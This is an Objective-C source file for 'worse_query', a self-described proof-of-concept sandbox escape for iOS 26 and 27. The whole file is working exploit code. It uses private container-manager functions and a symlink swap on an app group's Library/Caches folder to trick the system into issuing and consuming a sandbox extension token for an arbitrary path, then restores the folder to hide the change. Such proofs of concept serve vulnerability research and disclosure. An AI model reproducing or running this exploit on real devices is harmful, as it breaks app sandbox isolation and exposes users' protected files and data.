//
//  worse_query.m
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <dirent.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include "worse_query.h"

static pthread_mutex_t g_worse_query_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static void *g_cm_handle = NULL;
static container_query_create_fn g_wq_create = NULL;
static container_query_set_class_fn g_wq_set_class = NULL;
static container_query_set_identifiers_fn g_wq_set_group_identifiers = NULL;
static container_query_set_flags_fn g_wq_set_flags = NULL;
static container_query_set_part_fn g_wq_set_part = NULL;
static container_query_get_single_result_fn g_wq_get_single_result = NULL;
static container_query_free_fn g_wq_free = NULL;
static container_copy_sandbox_token_fn g_wq_copy_token = NULL;
static sandbox_extension_consume_fn g_wq_consume = NULL;
static sandbox_extension_release_fn g_wq_release = NULL;
static bool g_wq_symbols_ready = false;

static bool worse_query_init_symbols(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        g_cm_handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
        if (!g_cm_handle) {
            return;
        }
        g_wq_create = (container_query_create_fn)dlsym(g_cm_handle, "container_query_create");
        g_wq_set_class = (container_query_set_class_fn)dlsym(g_cm_handle, "container_query_set_class");
        g_wq_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(g_cm_handle, "container_query_set_group_identifiers");
        g_wq_set_flags = (container_query_set_flags_fn)dlsym(g_cm_handle, "container_query_operation_set_flags");
        g_wq_set_part = (container_query_set_part_fn)dlsym(g_cm_handle, "container_query_operation_set_part");
        g_wq_get_single_result = (container_query_get_single_result_fn)dlsym(g_cm_handle, "container_query_get_single_result");
        g_wq_free = (container_query_free_fn)dlsym(g_cm_handle, "container_query_free");
        g_wq_copy_token = (container_copy_sandbox_token_fn)dlsym(g_cm_handle, "container_copy_sandbox_token");
        g_wq_consume = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        g_wq_release = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");

        g_wq_symbols_ready = (g_wq_create &&
                              g_wq_set_class &&
                              g_wq_set_group_identifiers &&
                              g_wq_set_flags &&
                              g_wq_set_part &&
                              g_wq_get_single_result &&
                              g_wq_free &&
                              g_wq_copy_token &&
                              g_wq_consume &&
                              g_wq_release);
    });
    return g_wq_symbols_ready;
}

typedef struct {
    char library_path[PATH_MAX];
    char caches_path[PATH_MAX];
    char saved_path[PATH_MAX];
    dev_t link_dev;
    ino_t link_ino;
    bool has_saved;
    bool link_created;
} camlo_caches_guard_t;

static bool camlo_is_legacy_saved_name(const char *name) {
    return (strncmp(name, ".camlo_caches_saved_", 20) == 0 ||
            strncmp(name, ".camlo_caches_active_saved_", 27) == 0);
}

// Recover and validate <AppGroup>/Library/Caches under lock before running a query.
static bool camlo_caches_self_heal(const char *library_path) {
    if (!library_path || library_path[0] == '\0') {
        return false;
    }

    char caches_path[PATH_MAX];
    int caches_len = snprintf(caches_path, sizeof(caches_path), "%s/Caches", library_path);
    if (caches_len <= 0 || (size_t)caches_len >= sizeof(caches_path)) {
        return false;
    }

    char active_saved_path[PATH_MAX];
    int active_len = snprintf(active_saved_path, sizeof(active_saved_path), "%s/.camlo_caches_active_saved", library_path);
    if (active_len <= 0 || (size_t)active_len >= sizeof(active_saved_path)) {
        return false;
    }

    struct stat st;
    if (lstat(caches_path, &st) == 0) {
        if (S_ISLNK(st.st_mode)) {
            if (unlink(caches_path) != 0) {
                return false;
            }
        }
    } else if (errno != ENOENT) {
        return false;
    }

    if (lstat(caches_path, &st) != 0) {
        if (errno != ENOENT) {
            return false;
        }
        struct stat active_st;
        if (lstat(active_saved_path, &active_st) == 0 && S_ISDIR(active_st.st_mode)) {
            (void)rename(active_saved_path, caches_path);
        }
    }

    if (lstat(caches_path, &st) != 0 && errno == ENOENT) {
        DIR *dir = opendir(library_path);
        if (dir) {
            struct dirent *ent = NULL;
            while ((ent = readdir(dir)) != NULL) {
                if (!camlo_is_legacy_saved_name(ent->d_name)) {
                    continue;
                }
                char candidate[PATH_MAX];
                int cand_len = snprintf(candidate, sizeof(candidate), "%s/%s", library_path, ent->d_name);
                if (cand_len <= 0 || (size_t)cand_len >= sizeof(candidate)) {
                    continue;
                }
                struct stat cand_st;
                if (lstat(candidate, &cand_st) == 0 && S_ISDIR(cand_st.st_mode)) {
                    if (rename(candidate, caches_path) == 0) {
                        break;
                    }
                }
            }
            closedir(dir);
        }
    }

    if (lstat(caches_path, &st) != 0) {
        if (errno != ENOENT || mkdir(caches_path, 0755) != 0) {
            return false;
        }
        if (lstat(caches_path, &st) != 0) {
            return false;
        }
    }

    if (!S_ISDIR(st.st_mode)) {
        return false;
    }

    struct stat leftover_st;
    if (lstat(active_saved_path, &leftover_st) == 0) {
        if (S_ISLNK(leftover_st.st_mode) || S_ISREG(leftover_st.st_mode)) {
            (void)unlink(active_saved_path);
        } else if (S_ISDIR(leftover_st.st_mode)) {
            (void)rmdir(active_saved_path);
        }
    }

    DIR *dir = opendir(library_path);
    if (dir) {
        struct dirent *ent = NULL;
        while ((ent = readdir(dir)) != NULL) {
            if (!camlo_is_legacy_saved_name(ent->d_name)) {
                continue;
            }
            char candidate[PATH_MAX];
            int cand_len = snprintf(candidate, sizeof(candidate), "%s/%s", library_path, ent->d_name);
            if (cand_len <= 0 || (size_t)cand_len >= sizeof(candidate)) {
                continue;
            }
            struct stat cand_st;
            if (lstat(candidate, &cand_st) == 0) {
                if (S_ISLNK(cand_st.st_mode) || S_ISREG(cand_st.st_mode)) {
                    (void)unlink(candidate);
                } else if (S_ISDIR(cand_st.st_mode)) {
                    (void)rmdir(candidate);
                }
            }
        }
        closedir(dir);
    }

    return true;
}

// Preserve and restore <AppGroup>/Library/Caches using POSIX directory operations.
static bool camlo_caches_prepare(camlo_caches_guard_t *g, const char *library_path, const char *dest_path) {
    if (!g || !library_path || !dest_path || library_path[0] == '\0' || dest_path[0] == '\0') {
        return false;
    }
    memset(g, 0, sizeof(*g));

    if (strlen(library_path) >= sizeof(g->library_path)) {
        return false;
    }
    strlcpy(g->library_path, library_path, sizeof(g->library_path));

    int caches_len = snprintf(g->caches_path, sizeof(g->caches_path), "%s/Caches", library_path);
    if (caches_len <= 0 || (size_t)caches_len >= sizeof(g->caches_path)) {
        return false;
    }

    if (!camlo_caches_self_heal(library_path)) {
        return false;
    }

    bool found_slot = false;
    int primary_len = snprintf(g->saved_path, sizeof(g->saved_path), "%s/.camlo_caches_active_saved", library_path);
    if (primary_len > 0 && (size_t)primary_len < sizeof(g->saved_path)) {
        struct stat primary_st;
        if (lstat(g->saved_path, &primary_st) != 0) {
            if (errno == ENOENT) {
                found_slot = true;
            }
        } else if (S_ISLNK(primary_st.st_mode) || S_ISREG(primary_st.st_mode)) {
            if (unlink(g->saved_path) == 0) {
                found_slot = true;
            }
        } else if (S_ISDIR(primary_st.st_mode)) {
            if (rmdir(g->saved_path) == 0) {
                found_slot = true;
            }
        }
    }

    if (!found_slot) {
        pid_t pid = getpid();
        for (unsigned int seq = 0; seq < 64; seq++) {
            int saved_len = snprintf(g->saved_path, sizeof(g->saved_path), "%s/.camlo_caches_active_saved_%ld_%u", library_path, (long)pid, seq);
            if (saved_len <= 0 || (size_t)saved_len >= sizeof(g->saved_path)) {
                g->saved_path[0] = '\0';
                return false;
            }
            struct stat saved_st;
            if (lstat(g->saved_path, &saved_st) != 0) {
                if (errno == ENOENT) {
                    found_slot = true;
                    break;
                }
            } else if (S_ISLNK(saved_st.st_mode) || S_ISREG(saved_st.st_mode)) {
                if (unlink(g->saved_path) == 0) {
                    found_slot = true;
                    break;
                }
            } else if (S_ISDIR(saved_st.st_mode)) {
                if (rmdir(g->saved_path) == 0) {
                    found_slot = true;
                    break;
                }
            }
        }
    }

    if (!found_slot || rename(g->caches_path, g->saved_path) != 0) {
        g->saved_path[0] = '\0';
        return false;
    }
    g->has_saved = true;

    if (symlink(dest_path, g->caches_path) != 0) {
        if (g->has_saved) {
            (void)rename(g->saved_path, g->caches_path);
            g->has_saved = false;
        }
        return false;
    }

    struct stat link_st;
    if (lstat(g->caches_path, &link_st) != 0 || !S_ISLNK(link_st.st_mode)) {
        (void)unlink(g->caches_path);
        if (g->has_saved) {
            (void)rename(g->saved_path, g->caches_path);
            g->has_saved = false;
        }
        return false;
    }

    g->link_dev = link_st.st_dev;
    g->link_ino = link_st.st_ino;
    g->link_created = true;
    return true;
}

static bool camlo_caches_restore(const camlo_caches_guard_t *g) {
    if (!g || g->caches_path[0] == '\0') {
        return false;
    }

    if (g->link_created) {
        struct stat cur_st;
        if (lstat(g->caches_path, &cur_st) == 0) {
            if (!S_ISLNK(cur_st.st_mode) ||
                cur_st.st_dev != g->link_dev ||
                cur_st.st_ino != g->link_ino) {
                return false;
            }
            if (unlink(g->caches_path) != 0) {
                return false;
            }
        } else if (errno != ENOENT) {
            return false;
        }
    }

    if (g->has_saved && g->saved_path[0] != '\0') {
        return rename(g->saved_path, g->caches_path) == 0;
    }

    struct stat final_st;
    if (lstat(g->caches_path, &final_st) != 0) {
        if (errno == ENOENT) {
            return mkdir(g->caches_path, 0755) == 0;
        }
        return false;
    }
    return true;
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!target || target.length == 0 || !group || group.length == 0) {
        return -1;
    }

    pthread_mutex_lock(&g_worse_query_mutex);
    int64_t final_handle = -1;
    void *query = NULL;
    char *token = NULL;
    int lock_fd = -1;
    NSFileManager *files = [NSFileManager defaultManager];
    camlo_caches_guard_t guard;
    memset(&guard, 0, sizeof(guard));
    bool guard_active = false;

    do {
        if (!create_dir) {
            struct stat st;
            if (lstat(target.fileSystemRepresentation, &st) != 0 && errno == ENOENT) {
                final_handle = -255;
                break;
            }
        }

        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
        if (!groupRoot || groupRoot.path.length == 0) {
            final_handle = -1;
            break;
        }

        if (!worse_query_init_symbols()) {
            final_handle = -2;
            break;
        }

        const char *group_root_fs = groupRoot.fileSystemRepresentation;
        if (!group_root_fs || group_root_fs[0] == '\0') {
            final_handle = -1;
            break;
        }

        char library_path[PATH_MAX];
        int lib_len = snprintf(library_path, sizeof(library_path), "%s/Library", group_root_fs);
        if (lib_len <= 0 || (size_t)lib_len >= sizeof(library_path)) {
            final_handle = -4;
            break;
        }
        if (mkdir(group_root_fs, 0755) != 0 && errno != EEXIST) {
            final_handle = -4;
            break;
        }
        if (mkdir(library_path, 0755) != 0 && errno != EEXIST) {
            final_handle = -4;
            break;
        }

        char lock_path[PATH_MAX];
        int lock_len = snprintf(lock_path, sizeof(lock_path), "%s/.camlo_caches_lock", library_path);
        if (lock_len <= 0 || (size_t)lock_len >= sizeof(lock_path)) {
            final_handle = -4;
            break;
        }
        lock_fd = open(lock_path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
        if (lock_fd < 0 || flock(lock_fd, LOCK_EX) != 0) {
            final_handle = -4;
            break;
        }

        query = g_wq_create();
        if (!query) {
            final_handle = -3;
            break;
        }

        xpc_object_t identifier = xpc_string_create(group.UTF8String);
        g_wq_set_class(query, 7);
        g_wq_set_group_identifiers(query, identifier);
        g_wq_set_part(query, 3);
        uint64_t op_flags = alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL;
        g_wq_set_flags(query, op_flags);

        if (!camlo_caches_prepare(&guard, library_path, target.fileSystemRepresentation)) {
            final_handle = -4;
            break;
        }
        guard_active = true;

        void *result = g_wq_get_single_result(query);
        if (!result) {
            final_handle = -5;
            break;
        }
        token = g_wq_copy_token(result);
        if (!token) {
            final_handle = -6;
            break;
        }
        int64_t consumed = g_wq_consume(token);
        final_handle = (consumed < 0) ? -7 : consumed;
    } while (0);

    if (token) {
        free(token);
    }
    if (query && g_wq_free) {
        g_wq_free(query);
    }
    if (guard_active) {
        if (!camlo_caches_restore(&guard)) {
            if (final_handle >= 0) {
                if (g_wq_release) {
                    g_wq_release(final_handle);
                }
                final_handle = -4;
            }
        }
    }
    if (lock_fd >= 0) {
        (void)flock(lock_fd, LOCK_UN);
        close(lock_fd);
    }
    pthread_mutex_unlock(&g_worse_query_mutex);
    return final_handle;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    if (worse_query_init_symbols() && g_wq_release) {
        g_wq_release(handle);
    }
}
